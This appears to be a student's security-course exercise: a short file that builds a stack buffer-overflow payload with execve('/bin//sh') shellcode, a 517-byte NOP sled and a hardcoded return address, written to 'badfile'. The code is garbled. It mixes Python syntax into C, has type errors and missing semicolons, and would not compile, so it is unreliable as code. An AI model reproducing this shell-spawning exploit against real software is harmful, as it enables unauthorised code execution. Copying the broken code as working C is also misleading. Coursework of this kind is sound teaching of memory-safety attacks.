//Ryan Randazzo
//CECS 478 Sec 02
//Dec. 11th, 2022
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

//shellcode to replace content
char shellcode[]=
   "\x31\xc0"
    "\x50"
    "\x68""//sh"
    "\x68""/bin"
    "\x89\xe3"
    "\x50"
    "\x53"
    "\x89\xe1"
    "\x99"
    "\xb0\x0b"
    "\xcd\x80".encode('latin-1');

//fills NOP content
char NOPcontent = bytearray(0x90 for i in range(517));

char NOPcontent[517];
for(i = 0; i < NOPcontent; i++) {
    NOPcontent[i] = 'x90';
}

int start = 84;
NOPcontent[start:start + len(shellcode)] = shellcode;

// Decide the return address value 
// and put it somewhere in the payload
char ret = 0xBFFFF01C // TODO this to address plus an arbitrary offset
int offset = 134360234 // TODO set this to the difference of the address of base pointer($ebp) plus 4 bytes

char bit = 4     // Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + bit] = (ret).to_bytes(bit,byteorder='little') 

//Writes the content to a file
FILE *fp;
fp = fopen( 'badfile', 'w');
putc(content,fp);
fclose(fp);